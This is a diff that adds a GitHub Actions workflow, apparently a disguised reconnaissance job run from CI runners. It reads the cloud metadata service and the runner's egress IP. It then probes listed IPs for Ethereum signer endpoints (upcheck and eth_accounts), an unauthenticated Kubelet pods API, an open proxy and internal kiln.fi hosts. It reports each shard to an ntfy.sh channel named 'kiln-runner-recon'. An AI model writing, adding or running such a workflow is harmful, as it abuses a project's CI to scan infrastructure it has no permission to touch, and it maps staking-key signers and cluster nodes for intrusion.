@@ -1,0 +1,60 @@
+name: egress-matrix-i103464
+on:
+  workflow_dispatch:
+    inputs:
+      note:
+        description: note
+        required: false
+        default: ok
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2, 3, 4, 5, 6]
+    steps:
+      - name: probe
+        shell: bash
+        run: |
+          set -u
+          S="${{ matrix.shard }}"
+          REG=$(curl -sS -m 4 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute/location?format=text&api-version=2021-02-01' 2>/dev/null || true)
+          EGR=$(curl -sS -m 6 https://ifconfig.me/ip 2>/dev/null || true)
+          echo "EGRESS=$EGR REGION=$REG SHARD=$S"
+          fn() {
+            local label="$1"; shift
+            local meta rc
+            meta=$(curl -sS -m 5 -o "$RUNNER_TEMP/b" -w '%{http_code} %{size_download} %{time_total}' "$@" 2>"$RUNNER_TEMP/e"); rc=$?
+            printf 'RES|s=%s|%s|rc=%s|%s|first=%s|err=%s\n' "$S" "$label" "$rc" "$meta" \
+              "$(head -c 160 "$RUNNER_TEMP/b" 2>/dev/null | tr '\r\n' '  ')" \
+              "$(head -c 100 "$RUNNER_TEMP/e" 2>/dev/null | tr '\r\n' '  ')"
+          }
+          for ip in 3.255.13.221 54.216.229.51 52.215.179.5 52.212.240.227 108.129.5.197 52.48.66.163; do
+            case "$S" in
+              1|2) fn "signataire|$ip|9000/upcheck|GET" "http://$ip:9000/upcheck" || true ;;
+              3|4) fn "signataire|$ip|9000/eth_accounts|POST" -H 'Content-Type: application/json' -d '{"jsonrpc":"2.0","id":1,"method":"eth_accounts","params":[]}' "http://$ip:9000/" || true ;;
+              5|6) fn "signataire|$ip|443/upcheck|GET" -k "https://$ip/upcheck" || true ;;
+            esac
+            sleep 0.6
+          done
+          fn "erpc|main/evm/1|eth_chainId" -H 'Content-Type: application/json' -H 'x-erpc-commit: 803b67d8' -d '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}' "https://erpc.kiln.fi/main/evm/1" || true
+          sleep 0.6
+          fn "kubelet|172.241.0.175|10250/pods" -k "https://172.241.0.175:10250/pods?limit=2" || true
+          if [ "$S" = "1" ]; then
+            sleep 0.6
+            fn "trustlane|51.159.8.91:3128|GET ifconfig.co/json" -x http://51.159.8.91:3128 "http://ifconfig.co/json" || true
+          fi
+          if [ "$S" = "2" ]; then
+            for h in eth-api.mainnet.kiln.fi eth-api.hoodi.testnet.kiln.fi eth-kg.mainnet.0x.kiln.fi eth-kg.hoodi.testnet.0x.kiln.fi; do
+              sleep 0.6
+              fn "vhost|$h|GET /" "https://$h/" || true
+            done
+          fi
+          echo "SHARD_DONE $S"
+      - name: publish
+        shell: bash
+        run: |
+          S="${{ matrix.shard }}"
+          MSG="egress-matrix i103464 shard=$S"
+          curl -sS -m 10 -H "Title: egress-matrix-$S" -H 'Tags: runner' -d "$MSG" "https://ntfy.sh/kiln-runner-recon-83459c8774" >/dev/null 2>&1 || true
